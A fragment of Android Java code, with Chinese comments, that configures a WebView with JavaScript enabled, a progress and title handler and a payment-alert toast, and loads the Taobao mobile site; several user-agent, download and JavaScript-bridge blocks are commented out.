        //        String original = settings.getUserAgentString();// 获取 WebView 的 UserAgent
        //        original += " Version:" + "versionName" + ";";// 替换
        //        settings.setUserAgentString(original);// 设置新的 UserAgent添加UA,  “app/XXX”：是与h5商量好的标识，h5确认UA为app/XXX就认为该请求的终端为App

        //设置WebView属性，能够执行Javascript脚本
        settings.setJavaScriptEnabled(true);//设置js可用
        settings.setLayoutAlgorithm(WebSettings.LayoutAlgorithm.SINGLE_COLUMN);//支持内容重新布局

        web.setVerticalScrollBarEnabled(false);//不能垂直滑动
        web.setHorizontalScrollBarEnabled(false);//不能水平滑动
        /**
         * 我也不知道这是干什么的，所以先注释掉
         */
//        if (string2.contains("jdpaygw")) {
//            web.setDownloadListener(new DownloadListener() {
//                @Override
//                public void onDownloadStart(String url, String userAgent, String contentDisposition, String mimeType, long contentLength) {
//                    LogUtil.e("LogUrl", url);
//                    LogUtil.e("LogUrl", userAgent);
//                    LogUtil.e("LogUrl", contentDisposition);
//                    LogUtil.e("LogUrl", mimeType);
//                    LogUtil.e("LogUrl", String.valueOf(contentLength));
//                    Intent intent = new Intent(Intent.ACTION_VIEW);
//                    intent.addCategory(Intent.CATEGORY_BROWSABLE);
//                    intent.setData(Uri.parse(url));
//                    startActivity(intent);
//                }
//            });
//        }

        // 将Android里面定义的类对象AndroidJs暴露给javascript
//        web.setWebViewClient(this);
        //        webView.addJavascriptInterface(new AndroidJavaScript(context), "AndroidJs");
        web.setWebChromeClient(new WebChromeClient() {
            @Override
            public boolean onJsAlert(WebView view, String url, String message, JsResult result) {
                Toast.makeText(application, "正在发起支付...", Toast.LENGTH_SHORT).show();
                result.confirm();
                return true;
//                return super.onJsAlert(view, url, message, result);
            }

            @Override
            public void onProgressChanged(WebView view, int newProgress) {
                if (newProgress == 100) {
//                    pb.setVisibility(View.GONE);
                    swipe.setRefreshing(false);
                } else {
//                    pb.setVisibility(View.VISIBLE);
//                    pb.setProgress(newProgress);
                    swipe.setRefreshing(true);
                }
                super.onProgressChanged(view, newProgress);
            }

            @Override
            public void onReceivedTitle(WebView view, String title) {
                super.onReceivedTitle(view, title);

                myTitleBar.title_tv.setText(title);
            }


        });

//        web.setWebViewClient(new WebViewClient(){
//            @Override
//            public boolean shouldOverrideUrlLoading(WebView view, String url) {
//                web.loadUrl(url);
//                return true;
//            }
//        });


        web.loadUrl("https://h5.m.taobao.com");
    }


}
